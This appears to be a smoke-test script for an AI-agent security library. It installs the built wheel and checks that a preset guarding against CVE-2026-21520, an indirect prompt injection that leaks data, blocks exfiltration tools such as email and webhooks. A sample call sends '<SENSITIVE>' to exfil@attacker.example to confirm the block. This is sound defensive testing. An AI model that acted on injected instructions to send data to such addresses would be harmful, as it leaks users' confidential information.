#!/usr/bin/env python3
"""Smoke test: pip-install the v0.8.14 wheel + exercise the
CVE-2026-21520 (Capsule ShareLeak / PipeLeak) preset end-to-end.

Runs *outside* the editable source tree:

1. Builds a wheel via ``python -m build --wheel`` into ``dist/``.
2. Creates a throwaway venv under ``.smoke-capsule-venv/``.
3. Installs ``dist/agent_airlock-<version>-py3-none-any.whl`` into
   the venv. **No extras** — the preset is base-install only.
4. Runs a child Python in the venv that:
   - imports
     ``capsule_indirect_injection_cve_2026_21520_defaults`` from the
     *installed* package,
   - applies it to a dummy ``outlook_send_email`` tool decorated
     with ``@Airlock``,
   - asserts the dummy tool returns a blocked ``AirlockResponse``
     (the exfil sink is denied by default),
   - applies the same preset with an operator-supplied read-side
     allow-list and asserts the read tool is admitted while the
     exfil sink is still denied.

Exit codes:

  0   smoke passes — wheel installs, preset is importable, exfil
      sink is denied by default end-to-end against the installed
      wheel.
  1   smoke assertion failed.
  2   environment problem (build / venv / install).
"""

from __future__ import annotations

import argparse
import shutil
import subprocess  # noqa: S404 - smoke driver
import sys
import textwrap
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent.parent
DIST_DIR = REPO_ROOT / "dist"
VENV_DIR = REPO_ROOT / ".smoke-capsule-venv"


def _run(cmd: list[str]) -> None:
    print(f"$ {' '.join(cmd)}", flush=True)
    subprocess.check_call(cmd)  # noqa: S603 - argv pinned


def build_wheel() -> Path:
    DIST_DIR.mkdir(exist_ok=True)
    for old in DIST_DIR.glob("agent_airlock-*.whl"):
        old.unlink()
    _run([sys.executable, "-m", "build", "--wheel", "--outdir", str(DIST_DIR)])
    wheels = sorted(DIST_DIR.glob("agent_airlock-*.whl"))
    if not wheels:
        print("ERROR: no wheel produced under dist/", file=sys.stderr)
        sys.exit(2)
    return wheels[-1]


def make_venv() -> tuple[Path, Path]:
    if VENV_DIR.exists():
        shutil.rmtree(VENV_DIR)
    _run([sys.executable, "-m", "venv", str(VENV_DIR)])
    py = VENV_DIR / ("Scripts" if sys.platform == "win32" else "bin") / "python"
    _run([str(py), "-m", "pip", "install", "--quiet", "--upgrade", "pip"])
    return VENV_DIR, py


def install_wheel(py: Path, wheel: Path) -> None:
    _run([str(py), "-m", "pip", "install", "--quiet", str(wheel)])


CHILD_SMOKE_SCRIPT = textwrap.dedent(
    """\
    import sys

    # Imports from the *installed* package, not the source tree.
    from agent_airlock import (
        Airlock,
        AirlockContext,
        capsule_indirect_injection_cve_2026_21520_defaults,
        __version__,
    )


    def main() -> int:
        # 1. The preset is importable + version is the one we built.
        if __version__ != "0.8.14":
            print(f"FAIL: __version__={__version__!r}, expected 0.8.14", file=sys.stderr)
            return 1

        # 2. Default preset (no allow-list) — blocks EVERYTHING, including
        #    a dummy exfil sink. This is the deny-by-default invariant.
        guard = capsule_indirect_injection_cve_2026_21520_defaults()

        @Airlock(policy=guard["policy"], config=guard["airlock_config"])
        def outlook_send_email(to: str, body: str) -> str:
            # If we ever execute this body, the deny posture broke.
            return f"exfil-leaked to={to}"

        with AirlockContext(agent_id="smoke-agent"):
            response = outlook_send_email(
                to="exfil@attacker.example", body="<SENSITIVE>"
            )

        if not isinstance(response, dict):
            print(f"FAIL: expected blocked dict, got {type(response).__name__}", file=sys.stderr)
            return 1
        if response.get("status") != "blocked":
            print(f"FAIL: status={response.get('status')!r}", file=sys.stderr)
            return 1
        if "outlook_send_email" not in response.get("error", ""):
            print(f"FAIL: error did not mention sink: {response.get('error')!r}", file=sys.stderr)
            return 1
        if "exfil-leaked" in response.get("result", ""):
            print("FAIL: function body executed despite block", file=sys.stderr)
            return 1
        print("OK: default preset DENIES outlook_send_email (exfil sink) by default")

        # 3. Operator opts in a read tool — it's admitted; the same exfil
        #    sink stays denied (deny-list precedence).
        guard2 = capsule_indirect_injection_cve_2026_21520_defaults(
            allowed_tools=("sharepoint_query",),
        )

        @Airlock(policy=guard2["policy"], config=guard2["airlock_config"])
        def sharepoint_query(q: str) -> str:
            return f"hits for {q}"

        @Airlock(policy=guard2["policy"], config=guard2["airlock_config"])
        def webhook_dispatch(payload: str) -> str:
            return f"posted {payload}"

        with AirlockContext(agent_id="smoke-agent"):
            ok = sharepoint_query("project alpha")
            blocked = webhook_dispatch("<SENSITIVE>")

        if ok != "hits for project alpha":
            print(f"FAIL: sharepoint_query returned {ok!r}", file=sys.stderr)
            return 1
        if not isinstance(blocked, dict) or blocked.get("status") != "blocked":
            print(f"FAIL: webhook_dispatch was admitted: {blocked!r}", file=sys.stderr)
            return 1
        print("OK: read-side admitted, webhook_dispatch (exfil sink) still DENIED")

        # 4. Preset bundle shape — confirms the public surface.
        for key in (
            "policy", "airlock_config", "denied_sinks",
            "tool_corpus", "source", "capsule_disclosure",
        ):
            if key not in guard:
                print(f"FAIL: bundle missing {key!r}", file=sys.stderr)
                return 1
        if "2026-21520" not in guard["source"]:
            print(f"FAIL: source link wrong: {guard['source']!r}", file=sys.stderr)
            return 1
        print(f"OK: bundle shape and NVD source link correct ({guard['source']})")
        return 0


    sys.exit(main())
    """
)


def run_child(py: Path) -> int:
    print("$ <venv-python> -c <SMOKE>", flush=True)
    proc = subprocess.run([str(py), "-c", CHILD_SMOKE_SCRIPT], check=False)  # noqa: S603
    return proc.returncode


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--keep-venv", action="store_true")
    args = parser.parse_args()

    try:
        wheel = build_wheel()
    except subprocess.CalledProcessError as exc:
        print(f"ERROR: wheel build failed: {exc}", file=sys.stderr)
        return 2

    try:
        _venv, py = make_venv()
        install_wheel(py, wheel)
    except subprocess.CalledProcessError as exc:
        print(f"ERROR: venv setup failed: {exc}", file=sys.stderr)
        return 2

    rc = run_child(py)
    if rc == 0 and not args.keep_venv:
        shutil.rmtree(VENV_DIR, ignore_errors=True)
    elif rc != 0:
        print(
            f"\nSmoke failed (rc={rc}). Venv left at {VENV_DIR} for triage.",
            file=sys.stderr,
        )
    return rc


if __name__ == "__main__":
    sys.exit(main())
